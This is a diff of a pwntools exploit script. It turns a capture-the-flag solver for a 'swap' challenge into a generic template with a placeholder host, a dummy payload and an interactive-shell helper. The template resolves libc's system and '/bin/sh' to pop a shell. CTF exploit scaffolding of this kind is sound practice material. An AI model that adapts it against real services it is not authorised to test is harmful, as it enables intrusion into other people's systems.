@@ -5,16 +5,16 @@ from pwn import *
 # ==============================
 context(os='linux', arch='i686')
 context.log_level = 'debug' # output verbose log
-FILE_NAME = './swap'
-binary = ELF(FILE_NAME)
-LOCAL_HOST = 'localhost'
-LOCAL_PORT = 4444
-REMOTE_HOST = 'pwn1.chal.ctf.westerns.tokyo'
+FILE_NAME   = './a.out'
+REMOTE_LIBC = './libc.so.6-hoge'
+LOCAL_LIBC  = '/lib/x86_64-linux-gnu/libc.so.6'
+REMOTE_HOST = 'hoge.com'
 REMOTE_PORT = 19937
-REMOTE_LIBC = './libc.so.6-swap'
-LOCAL_LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
-conn = None
-dflg = 0
+LOCAL_HOST  = 'localhost'
+LOCAL_PORT  = 4444
+binary      = ELF(FILE_NAME)
+conn        = None
+dflg        = 0
 if len(sys.argv) > 1 and sys.argv[1] == 'r':
     conn = remote(REMOTE_HOST, REMOTE_PORT)
     libc = ELF(REMOTE_LIBC)
@@ -31,10 +31,9 @@ if len(sys.argv) > 2 and sys.argv[2] == 'd':
     dflg = 1
 
 def start():
-    log.info('Pwning')
+    log.info('----- EXPLOIT START -----')
     if(dflg == 1):
         raw_input('attach...')
-    time.sleep(5)
     recvn()
 
 def send(x):
@@ -46,31 +45,19 @@ def recv(x):
 def recvn(x=4096):
     conn.read(x)
 
+def shell():
+    conn.interact()
 
 # ==================================
 # PREPARING FOR EXPLOITATION ROUTINE
 # ==================================
 libc_system = libc.symbols['system']
 plt_read = binary.plt['read']
-got_offset_read = 0x28
 libc_binsh = next(libc.search('/bin/sh'))
 addr_bss = binary.bss()
-libc_base = 0x77777777
 # ----------------------------------
-def pattern1(x, y):
-    send('1')
-    recvn()
-    send(str(x))
-    recvn()
-    send(str(y))
-    recvn()
-
-def pattern2():
-    send('2')
-    recvn()
-
-def pattern0():
-    send('0')
+def attack(x):
+    send(x)
     recvn()
 
 
@@ -78,7 +65,6 @@ def pattern0():
 # MAIN EXPLOITATION ROUTINE
 # =========================
 start()
-pattern1(addr_bss+0x800, addr_bss+0x900)
-pattern2()
-pattern0()
-
+buf = "hoge"
+attack(buf)
+shell()
